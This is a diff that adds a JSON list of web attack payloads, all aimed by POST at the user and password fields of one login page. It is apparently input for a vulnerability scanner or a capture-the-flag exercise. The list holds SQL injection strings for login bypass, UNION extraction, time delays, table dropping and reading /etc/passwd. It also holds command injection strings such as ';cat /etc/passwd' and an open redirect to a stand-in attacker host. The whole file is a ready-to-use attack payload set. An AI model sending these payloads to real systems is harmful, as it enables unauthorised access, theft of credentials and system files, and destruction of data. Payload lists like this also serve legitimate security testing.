@@ -1,0 +1,746 @@
+[
+    [
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "' or 1=1 or '", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "' or 1=1 or '"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "admin' --", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "admin' --"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "admin' #", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "admin' #"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "admin'/*", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "admin'/*"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "/*comment*/", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "/*comment*/"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "/*!32302 1/0, */", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "/*!32302 1/0, */"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "'; SELECT sleep(10)", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "'; SELECT sleep(10)"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "'; DROP members --", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "'; DROP members --"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "'1'OR'1'", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "'1'OR'1'"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "1' OR '1'='1", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "1' OR '1'='1"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "1'or'1", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "1'or'1"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "' or 1=1--", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "' or 1=1--"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "' or 1=1#", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "' or 1=1#"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "' or 1=1/*", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "' or 1=1/*"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "') or '1'='1--", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "') or '1'='1--"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "') or ('1'='1--", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "') or ('1'='1--"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": " HAVING 1=1 --", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": " HAVING 1=1 --"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "1%20and%20 1=1", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "1%20and%20 1=1"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "'union select all 1,2,x,x,x,x \u2014", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "'union select all 1,2,x,x,x,x \u2014"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "'union select 1,2,3,x,x,x,x,@@version,x\u2013", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "'union select 1,2,3,x,x,x,x,@@version,x\u2013"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "'union+select+banner,null,null,null,null+from+v$version\u2013", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "'union+select+banner,null,null,null,null+from+v$version\u2013"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "'union+select+user,null,null,null,null+from+dual\u2013", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "'union+select+user,null,null,null,null+from+dual\u2013"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "'union+select+global_name,null,null,null,null+from+global_name\u2013", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "'union+select+global_name,null,null,null,null+from+global_name\u2013"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "'union+select+owner,null,null,null,null+from+all_tables\u2013", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "'union+select+owner,null,null,null,null+from+all_tables\u2013"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "'union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual\u2013", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "'union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual\u2013"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "%27union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual\u2013", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "%27union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual\u2013"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual)", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual)"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual)", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual)"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "' and 1 = any (select 1 from users where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "' and 1 = any (select 1 from users where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "1%20and%20substring(version(),1,1)=5", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "1%20and%20substring(version(),1,1)=5"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "(substring(version(),1,1)=5)", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "(substring(version(),1,1)=5)"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "1';select pg_sleep(2); \u2014", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "SQL Injection", 
+            "param": {
+                "password": "", 
+                "user": "1';select pg_sleep(2); \u2014"
+            }
+        }
+    ], 
+    [
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": ";phpinfo()", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": "", 
+                "user": ";phpinfo()"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": "phpinfo()", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": "", 
+                "user": "phpinfo()"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": ";echo \"afadsfaefasdfafezdfa\"", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": "", 
+                "user": ";echo \"afadsfaefasdfafezdfa\""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": "echo \"afadsfaefasdfafezdfa\"", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": "", 
+                "user": "echo \"afadsfaefasdfafezdfa\""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": ";cat /etc/passwd", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": "", 
+                "user": ";cat /etc/passwd"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": "$flag", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": "", 
+                "user": "$flag"
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": "; echo '$flag'", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "password": "", 
+                "user": "; echo '$flag'"
+            }
+        }
+    ], 
+    [
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Open Redirect", 
+            "param": {
+                "password": "https://attracker.com", 
+                "user": ""
+            }
+        }, 
+        {
+            "url": "https://own7.com/own7secondpage.php", 
+            "type": "POST", 
+            "class": "Open Redirect", 
+            "param": {
+                "password": "", 
+                "user": "https://attracker.com"
+            }
+        }
+    ]
+]
